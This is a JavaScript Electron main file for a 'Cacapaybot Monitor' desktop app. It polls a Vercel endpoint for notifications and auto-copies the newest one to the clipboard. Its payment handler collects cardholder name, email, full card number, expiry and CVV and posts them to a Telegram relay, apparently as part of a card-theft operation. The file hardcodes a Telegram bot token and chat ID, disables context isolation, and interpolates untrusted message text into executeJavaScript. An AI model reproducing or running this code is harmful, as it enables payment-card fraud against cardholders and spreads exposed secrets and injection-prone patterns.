const { app, BrowserWindow, ipcMain, Menu, Tray, nativeImage, clipboard } = require('electron');
const path = require('path');
const fetch = require('node-fetch');

// Configuration
const CONFIG = {
    API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    TELEGRAM_BOT_TOKEN: '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU',
    TELEGRAM_CHAT_ID: '6523794278',
    UPDATE_INTERVAL: 3000, // 3 secondes
    WINDOW_WIDTH: 1200,
    WINDOW_HEIGHT: 800
};

let mainWindow;
let tray;
let isQuitting = false;
let lastMessageId = 0;

// Créer la fenêtre principale
function createWindow() {
    mainWindow = new BrowserWindow({
        width: CONFIG.WINDOW_WIDTH,
        height: CONFIG.WINDOW_HEIGHT,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true
        },
        icon: path.join(__dirname, 'assets/icon.png'),
        title: 'Cacapaybot Monitor - Surveillance en temps réel',
        show: false,
        titleBarStyle: 'default'
    });

    // Charger l'interface HTML
    mainWindow.loadFile('public/index.html');

    // Afficher la fenêtre quand elle est prête
    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
        console.log('🖥️ Interface desktop démarrée');
    });

    // Gérer la fermeture
    mainWindow.on('close', (event) => {
        if (!isQuitting) {
            event.preventDefault();
            mainWindow.hide();
        }
    });

    // Ouvrir les DevTools en développement
    if (process.env.NODE_ENV === 'development') {
        mainWindow.webContents.openDevTools();
    }
}

// Créer le tray (icône dans la barre des tâches)
function createTray() {
    const iconPath = path.join(__dirname, 'assets/tray-icon.png');
    const icon = nativeImage.createFromPath(iconPath);
    
    tray = new Tray(icon);
    tray.setToolTip('Cacapaybot Monitor');
    
    const contextMenu = Menu.buildFromTemplate([
        {
            label: 'Afficher',
            click: () => {
                mainWindow.show();
                mainWindow.focus();
            }
        },
        {
            label: 'Masquer',
            click: () => {
                mainWindow.hide();
            }
        },
        { type: 'separator' },
        {
            label: 'Quitter',
            click: () => {
                isQuitting = true;
                app.quit();
            }
        }
    ]);
    
    tray.setContextMenu(contextMenu);
    
    // Double-clic pour afficher/masquer
    tray.on('double-click', () => {
        if (mainWindow.isVisible()) {
            mainWindow.hide();
        } else {
            mainWindow.show();
            mainWindow.focus();
        }
    });
}

// Récupérer les messages depuis l'API Vercel (notifications)
async function fetchMessages() {
    try {
        console.log('🔍 Vérification des messages depuis Vercel...');
        const response = await fetch(CONFIG.API_URL);
        const data = await response.json();
        
        if (data.success && data.notifications) {
            console.log(`📨 ${data.notifications.length} notifications trouvées sur Vercel`);
            return data.notifications.reverse(); // Plus récents en premier
        }
        return [];
    } catch (error) {
        console.error('❌ Erreur récupération messages Vercel:', error);
        return [];
    }
}

// Fonction pour simuler un message de paiement (pour test)
async function simulatePaymentMessage() {
    try {
        console.log('🧪 Simulation d\'un message de paiement...');
        
        const paymentMessage = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: Client Test
📧 Email: test@example.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        // Envoyer via Vercel
        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message de paiement simulé envoyé !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            
            // Créer une notification locale pour test
            const notification = {
                id: result.telegramResponse?.result?.message_id || Date.now(),
                message: paymentMessage,
                timestamp: new Date().toISOString(),
                sender: 'Cacapaybot',
                type: 'payment_message'
            };
            
            return [notification];
        }
        
        return [];
    } catch (error) {
        console.error('❌ Erreur simulation message:', error);
        return [];
    }
}

// Envoyer un message de test à l'API Vercel
async function sendTestMessage() {
    try {
        console.log('🧪 Envoi d\'un message de test à Vercel...');
        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: '🧪 TEST DEPUIS L\'INTERFACE DESKTOP !\n✅ Interface fonctionnelle\n📱 Vérifiez Telegram',
                type: 'test'
            })
        });
        
        const result = await response.json();
        console.log('✅ Message de test envoyé:', result);
        return result;
    } catch (error) {
        console.error('❌ Erreur envoi message test:', error);
        return { success: false, error: error.message };
    }
}

// Envoyer les messages à l'interface
async function updateMessages() {
    try {
        const messages = await fetchMessages();
        
        if (mainWindow && !mainWindow.isDestroyed()) {
            mainWindow.webContents.send('messages-updated', messages);
        }
        
        // Mettre à jour le titre avec le nombre de messages
        if (mainWindow && !mainWindow.isDestroyed()) {
            mainWindow.setTitle(`Cacapaybot Monitor - ${messages.length} messages détectés`);
        }
        
        // Copier automatiquement le dernier message dans le presse-papiers
        if (messages.length > 0) {
            const lastMessage = messages[0]; // Le plus récent (premier dans la liste)
            const messageText = lastMessage.message;
            
            try {
                // Copier dans le presse-papiers via Electron
                clipboard.writeText(messageText);
                console.log('📋 Message copié automatiquement dans le presse-papiers !');
                console.log('📄 Contenu copié:', messageText.substring(0, 100) + '...');
                
                // Envoyer une notification à l'interface
                if (mainWindow && !mainWindow.isDestroyed()) {
                    mainWindow.webContents.send('message-copied', {
                        message: messageText,
                        id: lastMessage.id,
                        timestamp: lastMessage.timestamp
                    });
                }
            } catch (error) {
                console.error('❌ Erreur lors de la copie:', error);
                // Essayer de copier via l'interface web
                if (mainWindow && !mainWindow.isDestroyed()) {
                    mainWindow.webContents.executeJavaScript(`
                        navigator.clipboard.writeText(\`${messageText.replace(/`/g, '\\`')}\`).then(() => {
                            console.log('📋 Message copié via l\\'interface web');
                        }).catch(err => {
                            console.error('❌ Erreur copie interface web:', err);
                        });
                    `);
                }
            }
        }
        
    } catch (error) {
        console.error('❌ Erreur mise à jour messages:', error);
    }
}

// Gestionnaires IPC
ipcMain.handle('get-messages', async () => {
    return await fetchMessages();
});

ipcMain.handle('test-api', async () => {
    return await sendTestMessage();
});

ipcMain.handle('simulate-payment', async () => {
    return await simulatePaymentMessage();
});

ipcMain.handle('send-payment', async (event, paymentData) => {
    try {
        console.log('💳 Envoi d\'un paiement à Vercel...', paymentData);
        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
📅 Expiration: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        console.log('✅ Paiement envoyé à Vercel:', result);
        return result;
    } catch (error) {
        console.error('❌ Erreur envoi paiement:', error);
        return { success: false, error: error.message };
    }
});

// Quand l'app est prête
app.whenReady().then(() => {
    createWindow();
    createTray();
    
    // Mise à jour périodique des messages
    setInterval(updateMessages, CONFIG.UPDATE_INTERVAL);
    
    // Mise à jour immédiate
    updateMessages();
    
    console.log('🚀 Cacapaybot Monitor démarré !');
});

// Gérer l'activation de l'app (macOS)
app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    } else {
        mainWindow.show();
    }
});

// Gérer la fermeture de l'app
app.on('before-quit', () => {
    isQuitting = true;
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

// Gérer les erreurs
process.on('uncaughtException', (error) => {
    console.error('❌ Erreur non gérée:', error);
});

console.log('🖥️ Interface desktop Cacapaybot Monitor initialisée');
